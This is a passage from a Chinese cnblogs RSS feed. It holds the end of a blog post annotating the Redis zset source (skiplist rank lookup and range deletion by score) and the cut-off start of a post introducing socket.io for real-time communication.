    unsigned &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; traversed = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i;

    x &lt;/span&gt;= zsl-&amp;gt;&lt;span&gt;header;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 好像没有相像中的简单哦
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 请仔细品&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = zsl-&amp;gt;level-&lt;span&gt;1&lt;/span&gt;; i &amp;gt;= &lt;span&gt;0&lt;/span&gt;; i--&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (x-&amp;gt;level[i].forward &amp;amp;&amp;amp; (traversed + x-&amp;gt;level[i].span) &amp;lt;=&lt;span&gt; rank)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; span 的作用？？&lt;/span&gt;
            traversed += x-&amp;gt;&lt;span&gt;level[i].span;
            x &lt;/span&gt;= x-&amp;gt;&lt;span&gt;level[i].forward;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (traversed ==&lt;span&gt; rank) {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; x;
        }
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　根据范围查找元素，整体是比较简单，迭代输出而已。只是 skiplist 的span维护，得好好想想。&lt;/p&gt;

&lt;p&gt;四、zrembyscore 根据分数删除元素&lt;/p&gt;
&lt;p&gt;　　zrembyscore, 首先这是个删除命令，其实它是根据分数查询，我们可以同时解析这两种情况。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;118&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c, &lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; zremrangebyscoreCommand(client *&lt;span&gt;c) {
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 几个范围删除，都复用 zremrangeGenericCommand
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ZRANGE_RANK/ZRANGE_SCORE/ZRANGE_LEX&lt;/span&gt;
&lt;span&gt;    zremrangeGenericCommand(c,ZRANGE_SCORE);
}
&lt;/span&gt;&lt;span&gt;void&lt;/span&gt; zremrangeGenericCommand(client *c, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; rangetype) {
    robj &lt;/span&gt;*key = c-&amp;gt;argv[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
    robj &lt;/span&gt;*&lt;span&gt;zobj;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; keyremoved = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    unsigned &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; deleted = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; score 存储使用另外的数据结构&lt;/span&gt;
&lt;span&gt;    zrangespec range;
    zlexrangespec lexrange;
    &lt;/span&gt;&lt;span&gt;long&lt;/span&gt;&lt;span&gt; start, end, llen;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 1: Parse the range. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 解析参数，除了 rank 方式的查询，其他两个都使用 另外的专门数据结构存储参数&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (rangetype ==&lt;span&gt; ZRANGE_RANK) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ((getLongFromObjectOrReply(c,c-&amp;gt;argv[&lt;span&gt;2&lt;/span&gt;],&amp;amp;start,NULL) != C_OK) ||&lt;span&gt;
            (getLongFromObjectOrReply(c,c&lt;/span&gt;-&amp;gt;argv[&lt;span&gt;3&lt;/span&gt;],&amp;amp;end,NULL) !=&lt;span&gt; C_OK))
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (rangetype ==&lt;span&gt; ZRANGE_SCORE) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zslParseRange(c-&amp;gt;argv[&lt;span&gt;2&lt;/span&gt;],c-&amp;gt;argv[&lt;span&gt;3&lt;/span&gt;],&amp;amp;range) !=&lt;span&gt; C_OK) {
            addReplyError(c,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;min or max is not a float&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (rangetype ==&lt;span&gt; ZRANGE_LEX) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zslParseLexRange(c-&amp;gt;argv[&lt;span&gt;2&lt;/span&gt;],c-&amp;gt;argv[&lt;span&gt;3&lt;/span&gt;],&amp;amp;lexrange) !=&lt;span&gt; C_OK) {
            addReplyError(c,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;min or max not valid string range item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
        }
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 2: Lookup &amp;amp; range sanity checks if needed. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; ((zobj = lookupKeyWriteOrReply(c,key,shared.czero)) == NULL ||&lt;span&gt;
        checkType(c,zobj,OBJ_ZSET)) &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; cleanup;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (rangetype ==&lt;span&gt; ZRANGE_RANK) {
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Sanitize indexes. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        llen &lt;/span&gt;=&lt;span&gt; zsetLength(zobj);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (start &amp;lt; &lt;span&gt;0&lt;/span&gt;) start = llen+&lt;span&gt;start;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (end &amp;lt; &lt;span&gt;0&lt;/span&gt;) end = llen+&lt;span&gt;end;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (start &amp;lt; &lt;span&gt;0&lt;/span&gt;) start = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Invariant: start &amp;gt;= 0, so this test will be true when end &amp;lt; 0.
         * The range is empty when start &amp;gt; end or start &amp;gt;= length. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; (start &amp;gt; end || start &amp;gt;=&lt;span&gt; llen) {
            addReply(c,shared.czero);
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; cleanup;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (end &amp;gt;= llen) end = llen-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 3: Perform the range deletion operation. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_ZIPLIST) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 针对不同的删除类型，使用不同的删除方法
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 所以，这段代码的复用体现在哪里呢？？？&lt;/span&gt;
        &lt;span&gt;switch&lt;/span&gt;&lt;span&gt;(rangetype) {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; ZRANGE_RANK:
            zobj&lt;/span&gt;-&amp;gt;ptr = zzlDeleteRangeByRank(zobj-&amp;gt;ptr,start+&lt;span&gt;1&lt;/span&gt;,end+&lt;span&gt;1&lt;/span&gt;,&amp;amp;&lt;span&gt;deleted);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; ZRANGE_SCORE:
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.1. 我们只看 score 的删除 --ziplist&lt;/span&gt;
            zobj-&amp;gt;ptr = zzlDeleteRangeByScore(zobj-&amp;gt;ptr,&amp;amp;range,&amp;amp;&lt;span&gt;deleted);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; ZRANGE_LEX:
            zobj&lt;/span&gt;-&amp;gt;ptr = zzlDeleteRangeByLex(zobj-&amp;gt;ptr,&amp;amp;lexrange,&amp;amp;&lt;span&gt;deleted);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zzlLength(zobj-&amp;gt;ptr) == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
            dbDelete(c&lt;/span&gt;-&amp;gt;&lt;span&gt;db,key);
            keyremoved &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (zobj-&amp;gt;encoding ==&lt;span&gt; OBJ_ENCODING_SKIPLIST) {
        zset &lt;/span&gt;*zs = zobj-&amp;gt;&lt;span&gt;ptr;
        &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt;(rangetype) {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; ZRANGE_RANK:
            deleted &lt;/span&gt;= zslDeleteRangeByRank(zs-&amp;gt;zsl,start+&lt;span&gt;1&lt;/span&gt;,end+&lt;span&gt;1&lt;/span&gt;,zs-&amp;gt;&lt;span&gt;dict);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; ZRANGE_SCORE:
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.2. skiplist 的删除rangeByScore 方法&lt;/span&gt;
            deleted = zslDeleteRangeByScore(zs-&amp;gt;zsl,&amp;amp;range,zs-&amp;gt;&lt;span&gt;dict);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; ZRANGE_LEX:
            deleted &lt;/span&gt;= zslDeleteRangeByLex(zs-&amp;gt;zsl,&amp;amp;lexrange,zs-&amp;gt;&lt;span&gt;dict);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (htNeedsResize(zs-&amp;gt;dict)) dictResize(zs-&amp;gt;&lt;span&gt;dict);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (dictSize(zs-&amp;gt;dict) == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
            dbDelete(c&lt;/span&gt;-&amp;gt;&lt;span&gt;db,key);
            keyremoved &lt;/span&gt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        }
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        serverPanic(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unknown sorted set encoding&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 4: Notifications and reply. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (deleted) {
        &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;event&lt;/span&gt;[&lt;span&gt;3&lt;/span&gt;] = {&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zremrangebyrank&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zremrangebyscore&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zremrangebylex&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;};
        signalModifiedKey(c&lt;/span&gt;-&amp;gt;&lt;span&gt;db,key);
        notifyKeyspaceEvent(NOTIFY_ZSET,&lt;/span&gt;&lt;span&gt;event&lt;/span&gt;[rangetype],key,c-&amp;gt;db-&amp;gt;&lt;span&gt;id);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (keyremoved)
            notifyKeyspaceEvent(NOTIFY_GENERIC,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;del&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,key,c-&amp;gt;db-&amp;gt;&lt;span&gt;id);
    }
    server.dirty &lt;/span&gt;+=&lt;span&gt; deleted;
    addReplyLongLong(c,deleted);

cleanup:
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (rangetype == ZRANGE_LEX) zslFreeLexRange(&amp;amp;&lt;span&gt;lexrange);
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; server.h, 范围查询参数存储&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Struct to hold a inclusive/exclusive range spec by score comparison. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
typedef &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; {
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; min, max;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; minex, maxex; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; are min or max exclusive? &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
} zrangespec;

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.1. ziplist 的删除range方法
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; t_zset.c&lt;/span&gt;
unsigned &lt;span&gt;char&lt;/span&gt; *zzlDeleteRangeByScore(unsigned &lt;span&gt;char&lt;/span&gt; *zl, zrangespec *range, unsigned &lt;span&gt;long&lt;/span&gt; *&lt;span&gt;deleted) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *eptr, *&lt;span&gt;sptr;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; score;
    unsigned &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; num = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (deleted != NULL) *deleted = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 找到首个在范围内的指针，进行迭代&lt;/span&gt;
    eptr =&lt;span&gt; zzlFirstInRange(zl,range);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (eptr == NULL) &lt;span&gt;return&lt;/span&gt;&lt;span&gt; zl;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; When the tail of the ziplist is deleted, eptr will point to the sentinel
     * byte and ziplistNext will return NULL. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt; ((sptr = ziplistNext(zl,eptr)) !=&lt;span&gt; NULL) {
        score &lt;/span&gt;=&lt;span&gt; zzlGetScore(sptr);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 肯定是比 min 大的，所以只需确认比 max 小即可&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (zslValueLteMax(score,range)) {
            &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Delete both the element and the score. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
            zl &lt;/span&gt;= ziplistDelete(zl,&amp;amp;&lt;span&gt;eptr);
            zl &lt;/span&gt;= ziplistDelete(zl,&amp;amp;&lt;span&gt;eptr);
            num&lt;/span&gt;++&lt;span&gt;;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; No longer in range. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        }
    }

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (deleted != NULL) *deleted =&lt;span&gt; num;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; zl;
}

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Find pointer to the first element contained in the specified range.
 * Returns NULL when no element is contained in the range. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *zzlFirstInRange(unsigned &lt;span&gt;char&lt;/span&gt; *zl, zrangespec *&lt;span&gt;range) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *eptr = ziplistIndex(zl,&lt;span&gt;0&lt;/span&gt;), *&lt;span&gt;sptr;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; score;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; If everything is out of range, return early. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 比较第1个元素和最后 一个元素，即可确认是否在范围内&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!zzlIsInRange(zl,range)) &lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;

    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (eptr !=&lt;span&gt; NULL) {
        sptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,eptr);
        serverAssert(sptr &lt;/span&gt;!=&lt;span&gt; NULL);

        score &lt;/span&gt;=&lt;span&gt; zzlGetScore(sptr);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; score &amp;gt;= min&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (zslValueGteMin(score,range)) {
            &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Check if score &amp;lt;= max. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (zslValueLteMax(score,range))
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; eptr;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
        }

        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Move to next element. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        eptr &lt;/span&gt;=&lt;span&gt; ziplistNext(zl,sptr);
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 检查zl是否在range范围内
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 检查第1个分数和最后一个数即可&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Returns if there is a part of the zset is in range. Should only be used
 * internally by zzlFirstInRange and zzlLastInRange. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; zzlIsInRange(unsigned &lt;span&gt;char&lt;/span&gt; *zl, zrangespec *&lt;span&gt;range) {
    unsigned &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;p;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; score;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Test for ranges that will always be empty. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (range-&amp;gt;min &amp;gt; range-&amp;gt;max ||&lt;span&gt;
            (range&lt;/span&gt;-&amp;gt;min == range-&amp;gt;max &amp;amp;&amp;amp; (range-&amp;gt;minex || range-&amp;gt;&lt;span&gt;maxex)))
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    p &lt;/span&gt;= ziplistIndex(zl,-&lt;span&gt;1&lt;/span&gt;); &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Last score. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (p == NULL) &lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;; &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Empty sorted set &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    score &lt;/span&gt;=&lt;span&gt; zzlGetScore(p);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; scoreMax &amp;gt;= min&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;zslValueGteMin(score,range))
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    p &lt;/span&gt;= ziplistIndex(zl,&lt;span&gt;1&lt;/span&gt;); &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; First score. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    serverAssert(p &lt;/span&gt;!=&lt;span&gt; NULL);
    score &lt;/span&gt;=&lt;span&gt; zzlGetScore(p);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; scoreMin &amp;lt;= max&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;zslValueLteMax(score,range))
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3.2. 删除 skiplist 中的range元素&lt;/span&gt;&lt;span&gt;
/*&lt;/span&gt;&lt;span&gt; Delete all the elements with score between min and max from the skiplist.
 * Min and max are inclusive, so a score &amp;gt;= min || score &amp;lt;= max is deleted.
 * Note that this function takes the reference to the hash table view of the
 * sorted set, in order to remove the elements from the hash table too. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
unsigned &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; zslDeleteRangeByScore(zskiplist *zsl, zrangespec *range, dict *&lt;span&gt;dict) {
    zskiplistNode &lt;/span&gt;*update[ZSKIPLIST_MAXLEVEL], *&lt;span&gt;x;
    unsigned &lt;/span&gt;&lt;span&gt;long&lt;/span&gt; removed = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i;

    x &lt;/span&gt;= zsl-&amp;gt;&lt;span&gt;header;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 找出每层小于 range-&amp;gt;min 的元素&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt; (i = zsl-&amp;gt;level-&lt;span&gt;1&lt;/span&gt;; i &amp;gt;= &lt;span&gt;0&lt;/span&gt;; i--&lt;span&gt;) {
        &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (x-&amp;gt;level[i].forward &amp;amp;&amp;amp; (range-&amp;gt;minex ?&lt;span&gt;
            x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;score &amp;lt;= range-&amp;gt;&lt;span&gt;min :
            x&lt;/span&gt;-&amp;gt;level[i].forward-&amp;gt;score &amp;lt; range-&amp;gt;&lt;span&gt;min))
                x &lt;/span&gt;= x-&amp;gt;&lt;span&gt;level[i].forward;
        update[i] &lt;/span&gt;=&lt;span&gt; x;
    }

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Current node is the last with score &amp;lt; or &amp;lt;= min. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    x &lt;/span&gt;= x-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 从第0层开始，依次删除引用，删除元素
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同有找到符合条件的元素时，一次循环也不会成立&lt;/span&gt;
    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Delete nodes while in range. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;while&lt;/span&gt; (x &amp;amp;&amp;amp;&lt;span&gt;
           (range&lt;/span&gt;-&amp;gt;maxex ? x-&amp;gt;score &amp;lt; range-&amp;gt;max : x-&amp;gt;score &amp;lt;= range-&amp;gt;&lt;span&gt;max))
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 保留下一次迭代&lt;/span&gt;
        zskiplistNode *next = x-&amp;gt;level[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;].forward;
        zslDeleteNode(zsl,x,update);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 同步删除 dict 数据&lt;/span&gt;
        dictDelete(dict,x-&amp;gt;&lt;span&gt;ele);
        zslFreeNode(x); &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Here is where x-&amp;gt;ele is actually released. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        removed&lt;/span&gt;++&lt;span&gt;;
        x &lt;/span&gt;=&lt;span&gt; next;
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; removed;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　删除的逻辑比较清晰，ziplist和skiplist分开处理。大体思路相同是：找到第一个符合条件的元素，然后迭代，直到第一个不符合条件的元素为止。&lt;/p&gt;

&lt;p&gt;　　set虽然从定义上与zset有很多相通之处，然而在实现上却是截然不同的。由于很多东西和之前介绍的知识有重合的地方，也没啥好特别说的。zset 的解析差不多就到这里了。&lt;/p&gt;
&lt;p&gt;　　你觉得zset还有什么有意思的实现呢？欢迎讨论。&lt;/p&gt;

</description>
<pubDate>Sun, 02 Feb 2020 14:08:00 +0000</pubDate>
<dc:creator>等你归去来</dc:creator>
<og:description>前面几篇文章，我们完全领略了redis的string,hash,list,set数据类型的实现方法，相信对redis已经不再神秘。 本篇我们将介绍redis的最后一种数据类型: zset 的相关实现。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yougewe/p/12253982.html</dc:identifier>
</item>
<item>
<title>3分钟接入socket.io使用 - DOM哥</title>
<link>http://www.cnblogs.com/iovec/p/12253943.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/iovec/p/12253943.html</guid>
<description>&lt;p&gt;传统的客户端和服务器通信协议是HTTP：客户端发起请求，服务端进行响应，服务端从不主动勾搭客户端。&lt;/p&gt;
&lt;p&gt;这种模式有个明显软肋，就是同步状态。而实际应用中有大量需要客户端和服务器实时同步状态的场景，比如聊天室、股票行情、在线共享文档等都需要客户端实时拿到服务器的最新状态。&lt;/p&gt;
&lt;p&gt;针对这种实时同步的需求，一种简单的方式是轮询，比如每隔5s发一次http请求去拿服务器最新的状态数据。但这种方式会存在数据延迟，浪费带宽等副作用。&lt;/p&gt;
&lt;p&gt;更完美的方式是使用WebSocket，浏览器原生支持，W3C标准协议，客户端和服务器建立持久性连接可以互发消息。&lt;/p&gt;

&lt;p&gt;socket.io 是一个类库，内部封装了WebSocket，可以在浏览器与服务器之间建立实时通信。&lt;/p&gt;
&lt;p&gt;如果某些旧版本的浏览器不支持WebSocket，socket.io会使用轮询代替。另外它还具有可发送二进制消息、多路复用、创建房间等特性，因此相比直接使用原生WebSocket，socket.io是更好的选择。&lt;/p&gt;
&lt;p&gt;开发一个实时应用主要分两部分：服务端和客户端，socket.io分别提供了相应的npm包供我们方便地调用。&lt;/p&gt;
&lt;p&gt;接下来就通过一个生动形象且有趣的栗子分别介绍这两大块。&lt;/p&gt;
